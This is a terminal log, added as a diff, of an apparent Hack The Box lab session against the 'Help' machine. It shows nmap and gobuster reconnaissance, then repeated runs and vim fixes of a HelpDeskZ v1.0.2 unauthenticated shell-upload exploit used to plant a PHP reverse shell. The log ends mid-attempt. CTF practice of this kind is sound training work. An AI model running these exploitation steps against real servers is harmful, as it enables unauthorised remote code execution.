@@ -1,0 +1,132 @@
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #ls                                    
+40300.py  nmap  php-reverse-shell.php       
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #nmap -sC -sV -oA nmap/help 10.10.10.121                                            
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 08:14 EST                          
+Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn         
+Nmap done: 1 IP address (0 hosts up) scanned in 4.64 seconds                             
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #ping 10.10.10.121                     
+PING 10.10.10.121 (10.10.10.121) 56(84) bytes of data.                                   
+64 bytes from 10.10.10.121: icmp_seq=1 ttl=63 time=207 ms                                
+64 bytes from 10.10.10.121: icmp_seq=2 ttl=63 time=714 ms                                
+64 bytes from 10.10.10.121: icmp_seq=3 ttl=63 time=505 ms                                
+^C                                          
+--- 10.10.10.121 ping statistics ---        
+3 packets transmitted, 3 received, 0% packet loss, time 2003ms                           
+rtt min/avg/max/mdev = 206.893/475.384/713.765/208.022 ms                                
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #nmap -sC -sV -oA nmap/help 10.10.10.121                                                                                                                                      
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 08:14 EST                          
+Nmap scan report for 10.10.10.121           
+Host is up (0.86s latency).                 
+Not shown: 997 closed ports                 
+PORT     STATE SERVICE VERSION              
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)      
+| ssh-hostkey:                              
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)                           
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)                          
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)                        
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))                                    
+|_http-server-header: Apache/2.4.18 (Ubuntu)                                             
+|_http-title: Apache2 Ubuntu Default Page: It works                                      
+3000/tcp open  http    Node.js Express framework                                         
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).               
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                                  
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                                                     
+Nmap done: 1 IP address (1 host up) scanned in 25.68 seconds                             
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #gobuster dir -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                                          
+===============================================================                          
+Gobuster v3.0.1                             
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)                          
+===============================================================                          
+[+] Url:            http://10.10.10.121     
+[+] Threads:        10                      
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt         
+[+] Status codes:   200,204,301,302,307,401,403                                          
+[+] User Agent:     gobuster/3.0.1          
+[+] Timeout:        10s                     
+===============================================================                          
+2020/01/04 08:19:06 Starting gobuster       
+===============================================================                          
+/support (Status: 301)                      
+/javascript (Status: 301)                   
+Progress: 12142 / 220561 (5.51%)^Z          
+[1]+  Stopped                 gobuster dir -u http://10.10.10.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt                                                  
+┌─[✗]─[root@parrot]─[~/hackthebox/help]     
+└──╼ #file php-reverse-shell.php            
+php-reverse-shell.php: PHP script, ASCII text                                            
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php                                                                                           
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit                                  
+Traceback (most recent call last):          
+  File "40300.py", line 57, in <module>     
+    currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))            
+NameError: name 'calendar' is not defined   
+┌─[✗]─[root@parrot]─[~/hackthebox/help]     
+└──╼ #vim 40300.py                                                                                                                                                                 
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php                                                                                           
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit                                  
+Traceback (most recent call last):          
+  File "40300.py", line 57, in <module>     
+    currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))            
+  File "/usr/lib/python2.7/_strptime.py", line 478, in _strptime_time                    
+    return _strptime(data_string, format)[0]                                             
+  File "/usr/lib/python2.7/_strptime.py", line 332, in _strptime                         
+    (data_string, format))                  
+ValueError: time data 'Sat, 04 Jan 2020 13:29:16 GMT' does not match format '%a; %d %b %Y %H:%M:%S %Z'                                                                             
+┌─[✗]─[root@parrot]─[~/hackthebox/help]     
+└──╼ #vim 40300.py                                                                                                                                                                 
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php                                                                                           
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit                                  
+Traceback (most recent call last):          
+  File "40300.py", line 57, in <module>     
+    currentTime = int(calendar.timegm(time.strptime(serverTime, timeFormat)))            
+  File "/usr/lib/python2.7/_strptime.py", line 478, in _strptime_time                    
+    return _strptime(data_string, format)[0]                                             
+  File "/usr/lib/python2.7/_strptime.py", line 332, in _strptime                         
+    (data_string, format))                  
+ValueError: time data 'Sat, 04 Jan 2020 13:30:44 GMT' does not match format '%a; %d %b %Y %H:%M:%S %Z'                                                                             
+┌─[✗]─[root@parrot]─[~/hackthebox/help]     
+└──╼ #vim 40300.py                                                                                                                                                                 
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php                                                                                           
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit                                  
+1578144766                                  
+^CTraceback (most recent call last):        
+  File "40300.py", line 65, in <module>     
+    response = requests.head(url)           
+  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 98, in head        
+    return request('head', url, **kwargs)   
+  File "/usr/local/lib/python2.7/dist-packages/requests/api.py", line 58, in request     
+    return session.request(method=method, url=url, **kwargs)                             
+  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 508, in request                                                                                         
+    resp = self.send(prep, **send_kwargs)   
+  File "/usr/local/lib/python2.7/dist-packages/requests/sessions.py", line 618, in send  
+    r = adapter.send(request, **kwargs)     
+  File "/usr/local/lib/python2.7/dist-packages/requests/adapters.py", line 440, in send  
+    timeout=timeout                         
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 601, in urlopen                                                                                    
+    chunked=chunked)                        
+  File "/usr/local/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 380, in _make_request                                                                              
+    httplib_response = conn.getresponse(buffering=True)                                  
+  File "/usr/lib/python2.7/httplib.py", line 1148, in getresponse                        
+    response.begin()                        
+  File "/usr/lib/python2.7/httplib.py", line 448, in begin                               
+    version, status, reason = self._read_status()                                        
+  File "/usr/lib/python2.7/httplib.py", line 404, in _read_status                        
+    line = self.fp.readline(_MAXLINE + 1)   
+  File "/usr/lib/python2.7/socket.py", line 480, in readline                             
+    data = self._sock.recv(self._rbufsize)  
+KeyboardInterrupt                           
+┌─[✗]─[root@parrot]─[~/hackthebox/help]     
+└──╼ #vim 40300.py                                                                                                                                                                 
+┌─[root@parrot]─[~/hackthebox/help]         
+└──╼ #python 40300.py http://10.10.10.121/support/uploads/tickets/ php-reverse-shell.php                                                                                           
+Helpdeskz v1.0.2 - Unauthenticated shell upload exploit                                  
+1578144932                                  
